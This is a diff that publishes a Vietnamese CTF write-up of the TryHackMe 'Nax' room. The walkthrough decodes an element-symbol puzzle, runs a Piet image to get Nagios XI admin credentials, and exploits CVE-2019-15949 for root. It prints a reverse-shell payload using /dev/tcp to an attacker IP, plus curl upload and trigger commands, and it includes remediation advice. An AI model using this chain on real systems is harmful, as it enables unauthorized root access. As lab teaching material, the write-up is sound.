@@ -1,6 +1,6 @@
 ---
 title: 'Nax'
-description: '[[THIẾU MÔ TẢ]]'
+description: 'Giải một câu đố bảng tuần hoàn để lấy thông tin đăng nhập, rồi khai thác CVE-2019-15949 trong Nagios XI để có shell root.'
 date: 2026-10-05
 platform: tryhackme
 room: 'Nax'
@@ -8,8 +8,158 @@ roomUrl: 'https://tryhackme.com/room/nax'
 difficulty: medium
 tags: [web, nagios xi, cve-2019-15949, esoteric language, steganography, enumeration]
 vulnClasses: [Information Disclosure, Known Vulnerability Exploitation, Remote Code Execution]
-translation: pending
-draft: true
+translation: done
+draft: false
 ---
 
-Bản dịch tiếng Việt đang được chuẩn bị. Đọc bản tiếng Anh.
+## TryHackMe: Nax — Từ một câu đố bảng tuần hoàn tới root trên Nagios XI
+
+_Lời giải phòng "Nax". Trang chủ giấu một chuỗi ký hiệu nguyên tố hóa học; giải mã chúng và chúng đánh vần ra đường dẫn tới một chương trình ngôn ngữ bí truyền (esoteric) thực sự "vẽ" ra mật khẩu admin. Thông tin đăng nhập đó mở một panel Nagios XI 5.5.6 có tính năng tải plugin chạy với tư cách root, và CVE-2019-15949 biến điều đó thành một bước nhảy duy nhất, tin cậy từ một request HTTP ẩn danh tới một shell root._
+
+> Các giá trị flag và thông tin đăng nhập đã được che. Nax là một phòng luyện tập được phép trên TryHackMe; mọi thứ ở đây được thực hiện trên một mục tiêu luyện tập hợp pháp.
+
+---
+
+### TL;DR — toàn bộ chuỗi
+
+<Callout type="tldr">
+
+Gợi ý ký hiệu nguyên tố ở trang chủ → giải mã ra `/PI3T.PNg` → chạy chương trình **Piet** bằng `npiet` để lấy thông tin đăng nhập `nagiosadmin` → đăng nhập **Nagios XI 5.5.6** → tải lên một plugin giám sát độc hại → kích hoạt tải System Profile, thứ chạy plugin **với tư cách root** (CVE-2019-15949) → **shell root**.
+
+</Callout>
+
+### Mục tiêu
+
+```text
+export IP=<target-ip>
+nmap -sC -sV -p- -T4 --min-rate=1000 $IP
+```
+
+```text
+22/tcp   open  ssh      OpenSSH
+25/tcp   open  smtp
+80/tcp   open  http
+443/tcp  open  ssl/http Apache 2.4.18     # Nagios XI 5.5.6 (build 1540830265)
+```
+
+Ngôi sao của bản quét là dịch vụ HTTPS: một bản cài **Nagios XI 5.5.6** trên Apache. Nagios XI là một sản phẩm giám sát mạng, và một máy chủ giám sát là một mục tiêu béo bở — nó thường có tầm với rộng trong mạng và lưu trữ thông tin đăng nhập của các check. Nhưng panel admin đòi một lần đăng nhập ta chưa có, nên ta bắt đầu ở web root công khai.
+
+### Liệt kê: trang chủ đang nói chuyện với ta
+
+Duyệt site, chi tiết thú vị không phải một thư mục hay một file backup — mà là một chuỗi **ký hiệu nguyên tố hóa học** được cấy vào trang:
+
+```text
+Ag Hg Ta Sb Po Pd Hg Pt Lr
+```
+
+Chín ký hiệu trên một máy hacking không phải là trang trí; đó là một cách mã hóa. Nước đi tự nhiên với bảng tuần hoàn là ánh xạ mỗi ký hiệu sang **số hiệu nguyên tử** của nó:
+
+```text
+Ag=47  Hg=80  Ta=73  Sb=51  Po=84  Pd=46  Hg=80  Pt=78  Lr=103
+```
+
+Đọc các số đó dưới dạng **ASCII** và chúng đánh vần ra một đường dẫn:
+
+```text
+47 80 73 51 84 46 80 78 103  ->  /  P  I  3  T  .  P  N  g
+```
+
+Vậy gợi ý trỏ tới `/PI3T.PNg`. Lấy nó — không cần xác thực:
+
+```text
+curl -sk https://$IP/PI3T.PNg -o PI3T.png
+```
+
+### Lấy thông tin đăng nhập: mật khẩu là một bức tranh
+
+`PI3T` là manh mối. File là một PNG, nhưng thẻ EXIF `Artist` của nó ghi **Piet Mondrian** — một cái gật đầu về **Piet**, một ngôn ngữ lập trình bí truyền mà mã nguồn của nó _chính là_ một bức ảnh: các khối màu là các câu lệnh. PNG này là một chương trình Piet chạy được.
+
+Đưa nó cho một trình thông dịch Piet công khai (`npiet`) và nó in ra thông tin đăng nhập admin của Nagios XI:
+
+```text
+# convert PNG -> PPM, then run it
+pngtopnm PI3T.png > PI3T.ppm
+npiet PI3T.ppm
+# -> nagiosadmin%<redacted-password>
+```
+
+Giờ ta có `nagiosadmin` và mật khẩu của nó. Chú ý điều vừa xảy ra: server công bố chính thông tin đăng nhập admin của nó trên web root không-xác-thực — "cánh cổng" duy nhất là một câu đố, không phải một biện pháp kiểm soát truy cập thật.
+
+### Điểm đặt chân: xác thực vào Nagios XI
+
+Đăng nhập tại panel Nagios XI với thông tin `nagiosadmin` vừa lấy. Về mặt lập trình, điều đó nghĩa là lấy một token CSRF `nsp` mới từ trang đăng nhập và POST nó cùng username và password:
+
+```text
+# fetch login page -> extract nsp token -> POST credentials with cookie jar
+# a 302 redirect to /nagiosxi/index.php == authenticated
+```
+
+Banner phiên bản đã cho ta biết đây là **5.5.6**, nằm gọn trong dải bị ảnh hưởng bởi **CVE-2019-15949** (Nagios XI ≤ 5.6.5). CVE đó là con đường của ta từ admin-trong-panel tới root-trên-máy.
+
+### Leo quyền: CVE-2019-15949, tải plugin chạy với tư cách root
+
+Lỗi là một chuỗi kinh điển kiểu nguy-hiểm-từ-thiết-kế:
+
+1. Một admin đã xác thực có thể tải lên một **plugin giám sát** qua `admin/monitoringplugins.php`. Một plugin chỉ là một file thực thi được thả vào thư mục plugin của Nagios.
+2. Khi một **System Profile** được tạo (`includes/components/profile/profile.php?cmd=download`), script `getprofile.sh` thuộc sở hữu root chạy — và nó được nối vào một mục **`sudo`** **không mật khẩu**, nên nó thực thi với tư cách **root**.
+3. `getprofile.sh` chạy các file trong thư mục plugin. Plugin ta tải lên do đó thực thi với tư cách root.
+
+Nên ta tải lên một "plugin" reverse-shell, rồi kích hoạt tải profile để bắn nó với tư cách root.
+
+```text
+# 1. Payload plugin — a file whose body is a reverse shell
+#    content:  bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
+curl -sk https://$IP/nagiosxi/admin/monitoringplugins.php -b cookie \
+  -F upload=1 -F nsp=<NSP> -F MAX_FILE_SIZE=20000000 \
+  -F 'uploadedfile=@check_ping;filename=check_ping;type=text/plain'
+#    -> "New plugin was installed"
+
+# 2. Start a listener, then trigger execution as root
+nc -lvnp 4444
+curl -sk 'https://$IP/nagiosxi/includes/components/profile/profile.php?cmd=download' -b cookie
+```
+
+Listener bắt được một shell root:
+
+```text
+connect to [ATTACKER] from (UNKNOWN) [<target-ip>] 35218
+root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+`uid=0`. Từ một request HTTP ẩn danh tới root, không có tương tác người dùng ở bất kỳ đâu trong chuỗi. Đọc các flag (giá trị đã che).
+
+<Callout type="note">
+
+Metasploit cung cấp cái này dưới dạng `exploit/linux/http/nagios_xi_plugins_check_plugin_rce`, và PoC độc lập của Jak Gibb (Exploit-DB **47299**) tự động hóa cùng các bước. Làm bằng tay một lần đáng giá hơn dùng lệnh một dòng — bạn thấy chính xác endpoint nào thực hiện việc tải lên và endpoint nào kích nổ nó với tư cách root.
+
+</Callout>
+
+### Mức độ nghiêm trọng
+
+<Callout type="critical">
+
+**Tới hạn — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Toàn bộ chuỗi là từ xa, không xác thực, và xác định. Một script ngắn đi từ con số không tới root trong vài giây, và một máy chủ Nagios bị chiếm là một bàn đạp mạnh vào phần còn lại của mạng được giám sát.
+
+</Callout>
+
+### Khắc phục — phá chuỗi ở bất kỳ mắt xích nào
+
+<Callout type="fix">
+
+1. **Vá Nagios XI** lên ≥ 5.6.6, bản vá CVE-2019-15949, và gỡ mục `sudo` không mật khẩu cho phép `getprofile.sh` thực thi các file plugin với tư cách root. Việc tải plugin giám sát không bao giờ nên là một đường thực thi mã với quyền root.
+2. **Diệt lỗ hổng lộ thông tin đăng nhập.** Xóa `/PI3T.PNg` và gợi ý ký hiệu nguyên tố ở trang chủ, và **xoay mật khẩu** **`nagiosadmin`** — coi giá trị bị lộ như đã cháy.
+3. **Giới hạn việc tải plugin** cho các vận hành viên tin cậy và xác thực/cô lập (sandbox) các plugin được tải lên. Khóa chặt SMTP và bất kỳ anonymous LDAP bind nào không cần thiết.
+
+</Callout>
+
+### Điểm rút ra
+
+- **Dữ liệu lạ trên một trang là một cách mã hóa, không phải trang trí.** Chín ký hiệu nguyên tố → số hiệu nguyên tử → ASCII → một đường dẫn file. Khi thứ gì đó trông như một câu đố, thì nó đúng là vậy.
+- **Esolang giấu bí mật ngay trước mắt.** Một "PNG" có EXIF artist là _Piet Mondrian_ chính là một chương trình Piet; mật khẩu được vẽ ra, không phải viết ra.
+- **Một thông tin đăng nhập bị lộ vẫn là một cú đột nhập.** Công bố thông tin admin trên web root — dù có che giấu — là một cú vượt xác thực hoàn toàn diễn ra chậm rãi.
+- **Ánh xạ phiên bản sang CVE.** `Nagios XI 5.5.6` trong banner là một đường thẳng tới CVE-2019-15949 và một bộ chạy plugin thuộc sở hữu root.
+
+_Ghi chú dọn dẹp: plugin test_ _`check_ping`_ _để lại trên máy trong lúc luyện tập nên được gỡ khỏi Manage Plugins sau đó._
+
+Cảm ơn bạn đã đọc. Nax là một lời nhắc tuyệt vời rằng trinh sát không chỉ là cổng và thư mục — đôi khi chiếc máy lặng lẽ trao chìa khóa cho bạn, và kỹ năng duy nhất cần có là để ý.
